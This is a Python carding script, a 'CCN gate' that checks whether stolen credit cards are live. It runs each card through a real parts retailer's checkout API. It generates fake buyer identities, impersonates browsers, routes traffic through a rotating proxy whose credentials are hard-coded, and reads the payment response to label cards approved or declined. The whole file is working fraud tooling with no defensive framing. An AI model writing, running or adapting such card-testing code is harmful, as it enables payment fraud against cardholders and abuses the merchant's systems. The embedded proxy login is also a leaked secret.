import random, time, base64, uuid
from faker import Faker
from random import choice
from urllib.parse import quote, unquote
from curl_cffi import requests
from colorama import init, Fore
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email(domain="gmail.com").replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


def ccn_gate(card):
    max_retries = 10
    retry_count = 0
    while retry_count < max_retries:
        try:
            init(autoreset=True)
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {"https": "http://6c87cc76d68ca38831bf:918d291b0f3847af@gw.dataimpulse.com:823"}
            cc_number, mes, ano_number, cvv = card.split('|')
            ano_number = f"20{ano_number}" if len(ano_number) == 2 else ano_number
            agente_user = UserAgent().random
            cliente.headers = {"User-Agent":agente_user}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            email = usuario()['email']
            phone = usuario()['phone']

            #============[Requests 1]============#
            respons = cliente.get("https://www.doallsaws.com/parts-store/199974-screw")
            uenc = capture(respons.text, '/add/uenc/', '/product/')
            form_key = capture(respons.text, 'name="form_key" type="hidden" value="', '"')

            #============[Requests 2]============#
            headers = {"Content-Type": "application/x-www-form-urlencoded","Origin": "https://www.doallsaws.com","Referer": "https://www.doallsaws.com/parts-store/199974-screw", "Cookie": f"form_key={form_key}"}
            data    = {"product": "337","selected_configurable_option": "","related_product": "","item": "337","form_key": form_key,"qty": "1"}
            respons = cliente.post(url=f"https://www.doallsaws.com/checkout/cart/add/uenc/{uenc}/product/337/", data=data, headers=headers)

            #============[Requests 3]============#
            headers = {"Referer": "https://www.doallsaws.com/parts-store/199974-screw"}
            respons = cliente.get(url="https://www.doallsaws.com/checkout/")
            form_id = capture(respons.text, '"entity_id":"', '"')

            #============[Requests 4]============#
            headers = {"Content-Type": "application/json","Origin": "https://www.doallsaws.com","Referer": "https://www.doallsaws.com/checkout/"}
            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":[street,""],"company":"","telephone":phone,"postcode":"10080","city":"New York","firstname":name,"lastname":last,"customAttributes":[{"attribute_code":"county","value":"NEW YORK"}],"extension_attributes":{"county":"NEW YORK"}},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":[street,""],"company":"","telephone":phone,"postcode":"10080","city":"New York","firstname":"asd","lastname":"asd","customAttributes":[{"attribute_code":"county","value":"NEW YORK"}],"saveInAddressBook":None},"shipping_method_code":"03","shipping_carrier_code":"ups","extension_attributes":{}}}
            respons = cliente.post(url=f"https://www.doallsaws.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)

            #============[Requests 5]============#
            headers = {"Content-Type": "application/json","Origin": "https://www.doallsaws.com","Referer": "https://www.doallsaws.com/checkout/"}
            data    = {"cartId":form_id,"paymentMethod":{"method":"ebizcharge_ebizcharge"},"email":email}
            respons = cliente.post(url=f"https://www.doallsaws.com/rest/default/V1/guest-carts/{form_id}/set-payment-information", json=data, headers=headers)

            #============[Requests 6]============#
            headers = {"Content-Type": "application/json","Origin": "https://www.doallsaws.com","Referer": "https://www.doallsaws.com/checkout/"}
            data    = {"cartId":form_id,"billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":[street],"company":"","telephone":phone,"postcode":"10080-0001","city":"NEW YORK","firstname":name,"lastname":last,"customAttributes":[{"attribute_code":"county","value":"NEW YORK"}],"extension_attributes":{"county":"NEW YORK"},"country_id":"US","region_code":"NY","region_id":43,"saveInAddressBook":None},"paymentMethod":{"method":"ebizcharge_ebizcharge","additional_data":{"cc_cid":cvv,"cc_type":"VI","cc_exp_year":ano_number,"cc_exp_month":str(int(mes)),"cc_number":cc_number,"cc_owner":f"{name} {last}","ebzc_avs_street":street,"ebzc_avs_zip":"10080-0001","ebzc_option":"new","ebzc_method_id":"","ebzc_cust_id":"","ebzc_save_payment":False,"paymentToken":False,"ebzc_option_type":"credit_card","rec_admin":False}},"email":email}
            respons = cliente.post(url=f"https://www.doallsaws.com/rest/default/V1/guest-carts/{form_id}/payment-information", json=data, headers=headers)
            message = capture(respons.text, '<message>', '</message>')
            if not message:
                save_html = open('page.html', 'w+', encoding="utf-8")
                save_html.write(respons.text)
                return "verified error."
            elif "Your billing address does not match your credit card." in message:
                return "AVS APPROVED."
            return message
        except Exception as e:
            #print(e)
            retry_count += 1
    else:
        return Fore.YELLOW + f"{cc_number}|{mes.zfill(2)}|{ano_number}|{cvv}|error|retries_fail|"
    


#if __name__ == "__main__":
    #print(ccn_gate("5227303704561574|06|2030|000"))